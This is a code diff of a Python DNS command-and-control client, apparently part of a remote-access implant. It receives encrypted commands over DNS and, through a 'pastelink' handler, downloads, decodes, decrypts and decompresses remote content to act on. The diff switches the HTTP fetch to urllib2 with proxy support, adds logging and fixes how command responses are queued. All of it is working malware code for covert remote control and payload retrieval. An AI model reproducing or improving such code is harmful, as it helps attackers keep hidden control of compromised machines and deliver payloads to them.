@@ -10,12 +10,12 @@ import os
 import platform
 import random
 import sys
-import requests
 import ascii85
 import zlib
 import tempfile
 import subprocess
 import logging
+import urllib2
 
 from ecpv import ECPV
 from picocmd import *
@@ -102,9 +102,11 @@ class DnsCommandsClient(Thread):
         try:
             _, _, addresses = socket.gethostbyname_ex(page)
             if len(addresses) < 2:
+                logging.warning('DNSCNC: short answer: {}'.format(addresses))
                 return []
 
         except socket.error as e:
+            logging.error('DNSCNC: Communication error: {}'.format(e))
             return []
 
         response = None
@@ -135,10 +137,12 @@ class DnsCommandsClient(Thread):
         return response.commands
 
     def on_pastelink(self, url, action, encoder):
-        response = requests.get(url)
-        if response.ok:
+        proxy = urllib2.ProxyHandler()
+        opener = urllib2.build_opener(proxy)
+        response = opener.open(url)
+        if response.code == 200:
             try:
-                content = response.content
+                content = response.read()
                 content = ascii85.ascii85DecodeDG(content)
                 content = self.encoder.unpack(content)
                 content = zlib.decompress(content)
@@ -173,6 +177,7 @@ class DnsCommandsClient(Thread):
     	logging.debug('commands: {}'.format(commands))
 
         for command in commands:
+            responses = []
             if isinstance(command, Policy):
                 self.poll = command.poll
 
@@ -188,8 +193,7 @@ class DnsCommandsClient(Thread):
                     key = self.encoder.process_kex_response(response[0].parcel)
                     self.spi = kex.spi
             elif isinstance(command, Poll):
-                for command in self._request(SystemInfo()):
-                    commands.append(command)
+                responses = self._request(SystemInfo())
             elif isinstance(command, PasteLink):
                 self.on_pastelink(command.url, command.action, self.encoder)
             elif isinstance(command, Connect):
@@ -199,9 +203,12 @@ class DnsCommandsClient(Thread):
             elif isinstance(command, Disconnect):
                 self.on_disconnect()
             elif isinstance(command, Exit):
-                self._request(Exit())
+                responses = self._request(Exit())
                 self.active = False
                 self.on_exit()
+
+            for command in responses:
+                commands.append(command)
 
     def run(self):
         while True:
